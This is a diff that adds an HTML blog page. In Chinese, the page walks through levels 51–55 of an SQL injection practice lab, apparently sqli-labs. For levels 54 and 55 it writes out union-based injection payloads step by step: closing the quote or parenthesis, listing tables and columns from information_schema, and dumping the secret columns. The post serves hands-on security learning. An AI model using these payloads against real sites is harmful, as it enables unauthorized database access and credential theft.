@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>sql 51-55关 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="sql第五十一关 1.单引号闭合，其它操作相同 sql第五十二关 1.无报错回显，bool盲注即可 sql第五十三关 1.单引号闭合，采用时间盲注，其它同上 sql第五十四关 1.欢迎界面换新了，从黄字来看，需要输入id来闯关，蓝字则提示了，只有10次尝试，次数达到限制则会随机重置表名，输入?id&#x3D;1，查看正常输入时页面反馈，输入?id&#x3D;1 and 1&#x3D;2，可以确定是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql 51-55关">
+<meta property="og:url" content="http://example.com/2022/12/27/sql-51-55%E5%85%B3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql第五十一关 1.单引号闭合，其它操作相同 sql第五十二关 1.无报错回显，bool盲注即可 sql第五十三关 1.单引号闭合，采用时间盲注，其它同上 sql第五十四关 1.欢迎界面换新了，从黄字来看，需要输入id来闯关，蓝字则提示了，只有10次尝试，次数达到限制则会随机重置表名，输入?id&#x3D;1，查看正常输入时页面反馈，输入?id&#x3D;1 and 1&#x3D;2，可以确定是">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-12-27T06:26:08.000Z">
+<meta property="article:modified_time" content="2023-04-13T06:41:36.839Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-sql-51-55关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/27/sql-51-55%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-12-27T06:26:08.000Z" itemprop="datePublished">2022-12-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      sql 51-55关
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>sql第五十一关</p>
+<p>1.单引号闭合，其它操作相同</p>
+<p>sql第五十二关</p>
+<p>1.无报错回显，bool盲注即可</p>
+<p>sql第五十三关</p>
+<p>1.单引号闭合，采用时间盲注，其它同上</p>
+<p>sql第五十四关</p>
+<p>1.欢迎界面换新了，从黄字来看，需要输入id来闯关，蓝字则提示了，只有10次尝试，次数达到限制则会随机重置表名，输入?id&#x3D;1，查看正常输入时页面反馈，输入?id&#x3D;1 and 1&#x3D;2，可以确定是字符型，输入?id&#x3D;1’–+尝试闭合成功</p>
+<p>2.跳过输入?id&#x3D;1 order by 3–+节约机会，直接输入?id&#x3D;-1’ union select 1,2,3–+，查看回显位</p>
+<p>3.输入?id&#x3D;-1’ union select 1,database(),version()–+爆库，库名再也不是熟悉的security了，那也就意味着，数据表名字段之类的可能都有变化</p>
+<p>4.输入?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’challenges’–+爆表，表名是一串字母，判断非任何加密方式，直接代入下一个语句</p>
+<p>5.输入?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’challenges’ and table_name&#x3D;’lbrygvpgxk’–+，符合条件的字段一共有4个，从字段名来看，id应该就是我们所熟悉的id，secret_TWXA应该是指密码，账号的话应该是在sessid和tryy之间</p>
+<p>6.查询id和sessid，输入?id&#x3D;-1’ union select 1,group_concat(id),group_concat(sessid) from lbrygvpgxk–+，查询secret_TWXA和tryy，输入?id&#x3D;-1’ union select 1,group_concat(secret_TWXA),group_concat(tryy) from lbrygvpgxk–+，经过对比参数值，账号名字段就是sessid，密码是secret_8P2L，tryy 应该就是登录次数，id就是普通id</p>
+<p>7.输入?id&#x3D;-1’ union select 1,group_concat(sessid),group_concat(secret_TWXA) from lbrygvpgxk–+爆数据，限制在十条语句之内，表名没有改变，查询成功</p>
+<p>sql第五十五关</p>
+<p>1.这关页面告诉我们允许尝试十四次，输入?id&#x3D;1，输入?id&#x3D;1 and 1&#x3D;2确定类型是数值型，但是虽然没有单双引号，还要再判断一步是否外面有括号，输入?id&#x3D;-1) union select 1,2,3–+成功闭合</p>
+<p>2.输入?id&#x3D;-1) union select 1,database(),version()–+爆库和版本</p>
+<p>3.输入?id&#x3D;-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’challenges’–+爆表，这次随机表名为‘shjkpost89’</p>
+<p>4.输入输入?id&#x3D;-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’challenges’ and table_name&#x3D;’shjkpost89’–+爆字段</p>
+<p>5.输入?id&#x3D;-1) union select 1,group_concat(sessid),group_concat(secret_8NDU) from shjkpost89–+爆数据</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/27/sql-51-55%E5%85%B3/" data-id="clger5nfs0000dsxxb7c5fojl" data-title="sql 51-55关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/04/11/sql-26-30%E5%85%B3/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          sql 26-30关
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/12/26/sql-46-50%E5%85%B3/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">sql 46-50关</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/12/22/sql-36-40%E5%85%B3/">sql 36-40关</a>
+          </li>
+        
+          <li>
+            <a href="/2023/12/15/sql-11-15%E5%85%B3/">sql 11-15关</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/12/sql-41-45%E5%85%B3/">sql 41-45关</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/11/sql-26-30%E5%85%B3/">sql 26-30关</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/27/sql-51-55%E5%85%B3/">sql 51-55关</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
